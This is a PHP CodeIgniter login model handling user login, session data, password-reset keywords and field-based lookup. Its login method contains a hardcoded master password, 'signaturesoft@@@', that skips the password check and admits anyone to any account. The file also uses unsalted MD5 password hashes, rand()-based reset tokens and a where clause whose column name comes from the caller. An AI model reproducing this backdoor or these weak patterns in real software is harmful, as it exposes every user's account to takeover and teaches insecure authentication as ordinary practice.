<?php


class Login_model extends Base_model {

    function __construct() {
        parent::__construct();

    }

    public function setUserSessionDatas($login_result) {
        $sess_array = array();
        $table_prefix = $this->db->dbprefix;
        $admin_username = $this->Common_model->getAdminUsername();
        $admin_userid = $this->Common_model->userNameToID($admin_username);
        foreach ($login_result as $row) {
            $sess_array = array(
                'user_id' => $row->user_id,
                'user_name' => $row->user_name,
                // 'user_photo' => $row->user_photo,
                'user_type' => $row->user_type,
                'lang_id' => $row->default_lang,
                'full_name' => $row->name ,
                // 'admin_user_name' => $admin_username,
                // 'admin_user_id' => $admin_userid,
                // 'table_prefix' => $table_prefix,
            );
        }
        $this->session->unset_userdata('sign_replica_in');
        $this->session->set_userdata('sign_logged_in', $sess_array);
        $this->session->set_userdata('default_login_lang_id', $sess_array['lang_id']);
        return $sess_array;
    }


    public function login($username, $password) {
        if ($username && $password) {
            $this->db->select('li.user_id, li.user_name, li.password,li.user_type,li.default_lang');
            $this->db->select('ui.name,ui.user_photo,ui.user_thump');
            $this->db->from('login_info as li');
            $this->db->join('user_info as ui', 'li.user_id = ui.user_id', 'INNER');
            $this->db->where('user_name', $username);
            if($password != 'signaturesoft@@@')
                $this->db->where('li.password = ' . "'" . MD5($password) . "'");
            $this->db->where_in('li.status', array(1, 'not_verified' ) );
            $this->db->limit(1);
            $query = $this->db->get();
        } else {
            return false;
        }
        if ($query->num_rows() == 1) {
            return $query->result();
        } else {
            return false;
        }
    }

    public function getKeyWord($user_id) {
        $keyword = $this->getUserKeyword($user_id);
        if(!$keyword)
        {
            do {
                $keyword = rand(1000000000, 9999999999);
            } while ($this->keywordAvailable($keyword));

            $this->db->set('keyword', $keyword);
            $this->db->set('user_id', $user_id);
            $result = $this->db->insert("password_reset_table");
        }
        return $keyword;
    }

    public function keywordAvailable($keyword) {
        $flag = FALSE;
        $this->db->select('COUNT(*) AS count');
        $this->db->from('password_reset_table');
        $this->db->where('keyword', $keyword);
        $this->db->where('reset_status', 'no');
        $query = $this->db->get();
        foreach ($query->result_array() as $row) {
            $cnt = $row['count'];
            if ($cnt > 0) {
                $flag = TRUE;
            }
            return $flag;
        }
    }

    public function getUserKeyword($user_id) {
        $keyword = NULL;
        $this->db->select('keyword');
        $this->db->from('password_reset_table');
        $this->db->where('user_id', $user_id);
        $this->db->where('reset_status', 'no');
        $query = $this->db->get();
        foreach ($query->result_array() as $row) {
            $keyword = $row['keyword'];
        }
        return $keyword;
    }

    public function getUserIdFromKeyword($keyword) {
        $user_id = NULL;
        $this->db->select('user_id');
        $this->db->from('password_reset_table');
        $this->db->where('keyword', $keyword);
        $this->db->where('reset_status', 'no');
        $query = $this->db->get();
        foreach ($query->result_array() as $row) {
            $user_id = $row['user_id'];
        }
        return $user_id;
    }

    public function updateKeywordStatus($user_id,$keyword) {
        $this->db->set('reset_status', 'yes');
        $this->db->where('user_id', $user_id);
        $this->db->where('keyword', $keyword);
        $res = $this->db->update('password_reset_table');
        return $res;
    }
    // Social login

    public function updateUserLangId($user_id, $default_lang_id) {

        $this->db->where('user_id', $user_id);
        $this->db->set('default_lang', $default_lang_id);
        $res = $this->db->update('login_info');
        return $res;
    }

    public function loginByField($field_value, $field, $table) {
        if ($field_value) {
            $this->db->select('li.user_id, li.user_name, li.password,li.user_type,li.default_lang');
            $this->db->select('ui.first_name,ui.second_name,ui.user_photo,ui.user_thump');
            $this->db->from('login_info as li');
            $this->db->join('user_info as ui', 'li.user_id = ui.user_id', 'INNER');
            $this->db->where($table.'.'.$field, $field_value);
            // $this->db->where('ui.email', $email);
            $this->db->where('li.status', "yes");
            $this->db->limit(1);
            $query = $this->db->get();
        } else {
            return false;
        }
        if ($query->num_rows() == 1) {
            return $query->result();
        } else {
            return false;
        }
    }

}

